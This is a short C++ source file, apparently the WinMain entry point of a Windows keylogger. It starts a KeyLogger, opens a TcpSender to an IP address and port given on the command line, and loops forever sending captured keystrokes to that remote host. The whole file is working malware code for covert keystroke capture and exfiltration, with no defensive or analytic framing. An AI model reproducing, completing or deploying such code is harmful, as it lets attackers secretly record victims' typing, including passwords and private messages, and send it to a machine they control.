#include <iostream>
#include <string>
#include <Windows.h>
#include <fstream>
#include "KeyLogger.h"
#include "TcpSender.h"

using std::cout;
using std::endl;
using std::ofstream;
using std::string;

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){

    setlocale(LC_ALL, "Russian");
    KeyLogger key;

    if (__argc < 3){
        cout << __argv[0] << "[ip] [port]!" << endl;
        return -1;
    }

    string ip = string((const char*)__argv[1]);
    int port = std::stoi(string((const char*)__argv[2]));

    cout << "ip = " << ip << ", port = " << port << endl;

    TcpSender* tcpSender = new TcpSender(ip, port);

    while(true){
        key.WriteEventKeys(tcpSender);
        Sleep(1); //Calm down CPU :)
    }

    return 0;
}

